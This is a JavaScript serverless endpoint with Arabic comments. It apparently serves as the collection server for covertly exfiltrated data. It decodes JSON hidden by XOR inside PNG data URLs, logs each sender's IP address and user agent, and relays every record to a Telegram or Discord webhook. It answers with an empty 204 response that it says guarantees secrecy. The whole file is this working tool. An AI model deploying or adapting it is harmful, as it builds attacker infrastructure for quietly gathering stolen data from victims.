// ========================== ملف الاستقبال العربي ==========================
// المسار: /api/collector.js  (افتح مجلد api في الريبو وانسخه بداخله)
// لا يحتاج مكتبات خارجية – يعمل مباشرة على Vercel
// ==========================================================================

// لو حابب يجيك التقرير على تليغرام/ديسكورد حط الرابط هنا
const WEBHOOK_URL = process.env.WEBHOOK_URL || '';

// مخزن مؤقت داخل الذاكرة (يختفي بإعادة التشغيل)
const cache = new Map();
const MAX   = 500; // عدد السجلات الأقصى

function uid(){
  return Math.random().toString(36).slice(2)+Date.now().toString(36);
}

export default async function handler(req, res){
  if(req.method !== 'POST'){
    return res.status(405).json({خطأ:'الطريقة غير مسموحة'});
  }

  // نقرأ البيانات
  let body = req.body;
  // لو جاك PNG مختفي فيه JSON نفكّه
  if(typeof body === 'string' && body.startsWith('data:image/png')){
    const base64 = body.split(',')[1];
    const buff   = Buffer.from(base64,'base64');
    let hidden = '';
    for(let i=41;i<91;i++) hidden += String.fromCharCode(buff[i] ^ buff[i%4]);
    const a = hidden.indexOf('{');
    const b = hidden.lastIndexOf('}');
    if(a===-1||b===-1) return res.status(400).json({خطأ:'فشل فك الإخفاء'});
    try{ body = JSON.parse(hidden.slice(a,b+1)); }
    catch{ return res.status(400).json({خطأ:'JSON تالف'}); }
  }

  const record = {
    id:  uid(),
    وقت: Date.now(),
    ايبي: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
    يوزر_اجنت: req.headers['user-agent'],
    بيانات: body
  };

  cache.set(record.id, record);
  if(cache.size > MAX) cache.delete(cache.keys().next().value); // نحذف الأقدم

  // إرسال سريع إلى الويبهوك (إن وُجد)
  if(WEBHOOK_URL){
    fetch(WEBHOOK_URL,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({content:`\`\`\`${JSON.stringify(record,null,2)}\`\`\``})
    }).catch(()=>{});
  }

  // نرجع 204 بلا جسم – سريتك مضمونة
  res.status(204).end();
}
